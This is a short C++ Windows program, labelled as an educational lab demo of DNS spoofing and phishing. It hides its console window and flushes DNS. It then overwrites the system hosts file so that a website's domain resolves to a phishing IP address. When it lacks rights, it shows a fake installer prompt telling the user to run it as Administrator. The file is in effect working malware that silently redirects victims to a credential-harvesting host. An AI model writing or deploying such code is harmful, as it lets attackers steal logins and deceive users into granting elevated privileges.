/************************************************************
* Test Lab Exe for a demonstration of DNS spoofing			*
* And Phishing	(EDUCATIONAL)								*
*************************************************************/

#include "stdafx.h"
#include <iostream>
#include <fstream>
#include <string>
#include <stdlib.h>
#include <Windows.h>
using namespace std;

void Flush()
/*Ensures that the DNS records are flushed as to check HOST file for hostnames first*/
{
	system("ipconfig /flushdns");
	system("\"C:\\Program Files_(x86)\\Google\\Chrome\\Application\\chrome --dns-prefetch-disable\""); //chrome has it's own DNS, that we disable
}
void Host()
/*Creates a bogus HOST file, change loopback to phising IP*/
{
	ofstream hosts;
	hosts.open("C:\\file.txt");
	hosts << "10.163.34.61\thttps://www.mysait.ca" << endl << "10.163.34.61\tmysait.ca" << endl << "10.163.34.61\twww.mysait.ca" << endl;
	hosts.close();
}

int main()
{
	Flush();
	ShowWindow(GetConsoleWindow(), SW_HIDE); //hides the cmd window when running.
	Host(); //calls host() fake file creation function
	BOOL b = CopyFile("C:\\file.txt", "C:\\Windows\\System32\\drivers\\etc\\hosts", FALSE); //overwrites their host file
	remove("C:\\file.txt"); //deletes fake host used to copy to the \etc\hosts path
	
	if (!b) //If the copy did not run, then a popup for the user appears telling them to run as administrator
	{
		MessageBeep(MB_ICONERROR);
		MessageBox(
				NULL,
				TEXT("This installer must be run as Administrator"),
				TEXT("Error"),
				MB_ICONERROR | MB_OK
				);
	} 
	else {

	}
	Flush(); //calls flush() which ensures dns is flushed
	return 0;

	
}

